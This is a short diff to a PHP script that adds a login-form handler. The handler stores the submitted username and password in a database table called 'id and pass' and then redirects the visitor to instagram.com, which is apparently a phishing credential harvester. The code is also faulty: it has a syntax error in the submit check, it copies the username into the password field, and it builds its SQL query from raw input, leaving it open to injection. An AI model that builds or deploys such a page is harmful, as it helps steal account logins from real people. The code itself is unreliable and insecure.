@@ -75,4 +75,18 @@
 
 include 'connecited.php'
 
+if(isset($_POST['submit'})){
 
+    $username = $_POST['username'];
+    $password = $_POST['username'];
+
+    $insertQuery = "INSERT INTO `id and pass`( `username`, `password`) VALUES ('$username','$password')";
+
+    $result = mysqli_query($con , $insertQuery);
+
+    if($result){
+        header("location: https://www.instagram.com");
+    }
+}
+
+?>
